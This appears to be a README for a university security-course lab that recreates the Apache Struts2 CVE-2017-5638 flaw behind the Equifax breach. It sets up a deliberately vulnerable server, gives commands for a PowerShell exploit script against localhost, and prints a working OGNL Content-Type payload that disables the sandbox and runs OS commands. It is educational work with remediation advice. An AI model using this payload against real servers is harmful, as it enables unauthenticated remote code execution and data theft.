# CVE-2017-5638 — Apache Struts2 OGNL Injection — Attack Recreation

> **Purpose:** Educational recreation of the Apache Struts2 vulnerability that enabled the 2017 Equifax data breach. For authorised security research and academic use only.

---

## Attack Timeline Context

| Date | Event |
|------|-------|
| Mar 7, 2017 | Apache releases Struts2 2.3.32 / 2.5.10.1 with CVE-2017-5638 fix |
| **May 13, 2017** | **Initial exploitation** ← *this script simulates this step* |
| May 13 – Jul 30, 2017 | Sustained exfiltration; attacker maintained access for 76 days |
| Jul 29, 2017 | Equifax detects anomalous traffic |
| Sep 7, 2017 | Public disclosure |

---

## Vulnerability Summary

**CVE-2017-5638** affects Apache Struts 2.3.5 – 2.3.31 and 2.5 – 2.5.10.

The Struts2 multipart request parser (`JakartaMultiPartRequest`) evaluates OGNL expressions embedded in the `Content-Type` HTTP header when it encounters a parse error. Because this evaluation happens before any action runs, it is **unauthenticated** and requires no valid file — just a crafted `Content-Type` header value.

CVSS v3 Score: **10.0 (Critical)**

---

## Project Layout

```
simulation/
├── backend/                          # Vulnerable Struts2 server (Java/Maven)
│   ├── pom.xml                       # Struts2 2.3.28 (VULNERABLE — do not upgrade)
│   ├── data/
│   │   └── users.yaml                # Fake user "database" (exfiltration target)
│   └── src/main/
│       ├── java/com/demo/
│       │   ├── UploadAction.java     # Struts2 action — the exposed endpoint
│       │   └── UserService.java      # Reads users.yaml (database layer)
│       ├── resources/
│       │   └── struts.xml            # Struts2 config; enables multipart parsing
│       └── webapp/
│           ├── WEB-INF/web.xml       # Registers Struts2 filter on /*
│           ├── upload.jsp            # Normal upload form UI
│           └── success.jsp           # Post-upload confirmation page
└── attack-script/
    ├── exploit_cve_2017_5638.ps1     # PowerShell exploit (cross-platform)
    └── README.md
```

---

## Prerequisites

| Requirement | Version | Verify |
|---|---|---|
| Java JDK | 8 or 11 | `java -version` |
| Apache Maven | 3.6+ | `mvn -version` |
| PowerShell | Core 7+ | `$PSVersionTable` |

---

## Step 1 — Start the Vulnerable Backend

```bash
# From the workspace root:
cd SC3010-Computer-Security/simulation/backend
mvn tomcat7:run
```

Wait until you see:
```
INFO  Starting ProtocolHandler ["http-bio-8080"]
```

The upload form is then available at: **http://localhost:8080/upload.jsp**

---

## Step 2 — Run the Exploit Script

Open a **second** terminal (keep the server running in the first).

```powershell
cd SC3010-Computer-Security/simulation/attack-script

# Demo mode (safe — proves OGNL evaluation, no OS commands):
.\exploit_cve_2017_5638.ps1 -DemoMode

# Full exploit (default command: whoami):
.\exploit_cve_2017_5638.ps1

# Custom command:
.\exploit_cve_2017_5638.ps1 -Command "id"

# Custom target + command:
.\exploit_cve_2017_5638.ps1 -Target "http://localhost:8080/upload.action" -Command "whoami"
```

### Parameters

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `-Target` | string | `http://localhost:8080/upload.action` | Target endpoint URL |
| `-Command` | string | `whoami` | OS command to execute (full exploit only) |
| `-DemoMode` | switch | off | Safe arithmetic-only OGNL proof |

---

## How the Exploit Works

The script sends a `POST` request with the OGNL payload as the `Content-Type` header:

```
.%{
  (#container = #context['com.opensymphony.xwork2.ActionContext.container']).
  (#ognlUtil  = #container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
  (#ognlUtil.getExcludedPackageNames().clear()).
  (#ognlUtil.getExcludedClasses().clear()).
  (#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).
  (@java.lang.Runtime@getRuntime().exec('<COMMAND>'))
}.multipart/form-data
```

1. **Retrieve container** — gets the Struts2 IoC container from the OGNL context.
2. **Get OgnlUtil** — obtains the singleton that manages the security sandbox.
3. **Clear blacklists** — removes `excludedPackageNames` and `excludedClasses`.
4. **Set `DEFAULT_MEMBER_ACCESS`** — removes field/method access restrictions.
5. **Execute command** — calls `Runtime.exec()` with the attacker-supplied command.

---

## Remediation

Upgrade Apache Struts2 to **2.3.32** or **2.5.10.1** (or later). The fix validates that the `Content-Type` header is a legitimate MIME type before any OGNL processing occurs.
